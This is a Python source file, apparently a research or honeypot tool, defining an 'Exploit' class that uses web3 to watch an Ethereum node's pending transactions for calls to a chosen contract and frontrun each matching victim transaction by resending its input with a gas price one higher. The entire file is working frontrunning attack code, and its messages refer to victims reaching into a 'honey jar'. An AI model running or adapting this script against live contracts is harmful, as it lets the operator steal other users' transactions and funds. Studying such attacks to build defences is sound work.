from web3 import Web3
import time


class Exploit:
    def __init__(self, txs: list, w3: Web3, contract: str, account: str):
        self.txs = txs
        self.w3 = w3
        self.contract = contract
        self.account = account
        pass

    def __repr__(self):
        return "Exploit: (txs={})".format(self.txs)

    def frontrun(self, flush=False):
        print("Waiting for a victim to reach into the honey jar.")

        # Wait for each tx and frontrun it.
        for tx in self.txs:
            victim_tx = self.wait_for(self.contract, tx, flush=flush)

            frontrun_tx = {
                "from": self.account,
                "to": self.contract,
                "gasPrice": hex(victim_tx["gasPrice"] + 1),
                "input": victim_tx["input"],
                "gas": victim_tx["gas"],
                "value": victim_tx["value"],
            }

            print("Frontrunning with tx: {tx}".format(tx=frontrun_tx))
            receipt = self.send_tx(frontrun_tx)
            print(
                "Mined transaction: {tx}".format(tx=(receipt["transactionHash"].hex()))
            )

    def send_tx(self, tx: dict) -> str:
        # Make sure the addresses are checksummed.
        tx["from"] = Web3.toChecksumAddress(tx["from"])
        tx["to"] = Web3.toChecksumAddress(tx["to"])

        tx_hash = self.w3.eth.sendTransaction(tx)
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash, timeout=300)

        return tx_receipt

    def wait_for(self, contract, tx, flush=False):
        # Setting up filter
        pending_filter = self.w3.eth.filter("pending")
        # Ignore existing transactions and wait for new ones
        if flush is True:
            print(
                "Flushing {} existing transactions.".format(
                    len(pending_filter.get_new_entries())
                )
            )

        while True:
            time.sleep(1)

            pending_txs_hashes = pending_filter.get_new_entries()
            print("Processing {} transactions.".format(len(pending_txs_hashes)))
            for hash in pending_txs_hashes:
                pending_tx = self.w3.eth.getTransaction(hash)

                # Skip some uninteresting transactions
                if (pending_tx is None) or (pending_tx.get("to") is None):
                    continue

                # Skip transactions already mined
                if pending_tx.get("blockNumber") is not None:
                    continue

                if (pending_tx.get("to", str("")).lower() == contract.lower()) and (
                    pending_tx.get("input", "").lower()
                    == tx.tx_data.get("input", "").lower()
                ):
                    print(
                        "Found pending tx: {tx} from: {sender}.".format(
                            tx=pending_tx.get("hash", b"0").hex(),
                            sender=pending_tx.get("from"),
                        )
                    )
                    return pending_tx
